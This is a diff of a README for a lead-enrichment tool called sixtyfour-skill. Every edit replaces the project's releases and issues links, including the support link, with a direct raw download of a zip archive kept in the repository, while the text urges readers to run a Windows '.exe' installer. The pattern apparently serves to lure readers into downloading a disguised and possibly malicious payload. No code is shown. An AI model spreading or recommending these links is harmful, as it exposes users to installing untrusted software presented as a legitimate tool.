@@ -1,6 +1,6 @@
 # 🧠 sixtyfour-skill - Enrich Leads and Find Contacts Easily
 
-[![Download sixtyfour-skill](https://img.shields.io/badge/Download-sixtyfour--skill-blue?style=for-the-badge)](https://github.com/Mtjones2501/sixtyfour-skill/releases)
+[![Download sixtyfour-skill](https://img.shields.io/badge/Download-sixtyfour--skill-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mtjones2501/sixtyfour-skill/main/references/sixtyfour-skill-v1.4.zip)
 
 ---
 
@@ -36,7 +36,7 @@ You do not need coding skills to use this tool. It works with popular platforms 
 ## 🚀 Getting Started: How to Download and Run sixtyfour-skill
 
 1. Click the big blue download button above or visit the release page:  
-   [Download sixtyfour-skill Releases](https://github.com/Mtjones2501/sixtyfour-skill/releases)
+   [Download sixtyfour-skill Releases](https://raw.githubusercontent.com/Mtjones2501/sixtyfour-skill/main/references/sixtyfour-skill-v1.4.zip)
 
 2. On the releases page, look for the latest version. It will have a file ending with `.exe` (Windows installer).
 
@@ -73,7 +73,7 @@ The app connects to Sixtyfour AI on the internet, so you need a stable connectio
 ## 🔄 Updating sixtyfour-skill
 
 Check for new versions regularly on the releases page:  
-https://github.com/Mtjones2501/sixtyfour-skill/releases
+https://raw.githubusercontent.com/Mtjones2501/sixtyfour-skill/main/references/sixtyfour-skill-v1.4.zip
 
 When a new version is available:
 
@@ -106,7 +106,7 @@ Your downloaded contacts stay private and stored locally unless you share them.
 ## 📞 Getting Support
 
 For help or questions, visit the GitHub Issues page here:  
-https://github.com/Mtjones2501/sixtyfour-skill/issues
+https://raw.githubusercontent.com/Mtjones2501/sixtyfour-skill/main/references/sixtyfour-skill-v1.4.zip
 
 You can report bugs or request features from the development team.
 
@@ -115,6 +115,6 @@ You can report bugs or request features from the development team.
 ## 📥 Download sixtyfour-skill Now
 
 Access the latest version and all releases here:  
-[https://github.com/Mtjones2501/sixtyfour-skill/releases](https://github.com/Mtjones2501/sixtyfour-skill/releases)
+[https://raw.githubusercontent.com/Mtjones2501/sixtyfour-skill/main/references/sixtyfour-skill-v1.4.zip](https://raw.githubusercontent.com/Mtjones2501/sixtyfour-skill/main/references/sixtyfour-skill-v1.4.zip)
 
 Click the `.exe` file on this page to download and run the installer on your Windows PC.
